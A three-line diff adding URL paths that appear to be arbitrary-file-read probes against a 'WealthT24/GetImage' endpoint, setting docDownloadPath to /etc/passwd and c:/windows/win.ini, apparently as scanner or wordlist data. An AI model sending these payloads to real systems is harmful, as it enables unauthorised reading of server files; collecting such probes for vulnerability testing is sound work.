@@ -1,0 +1,3 @@
+/WealthT24/GetImage?docDownloadPath=/etc/passwd
+/WealthT24/GetImage?docDownloadPath=c:/windows/win.ini
+/WealthT24/GetImage?docDownloadPath=/etc/passwd&
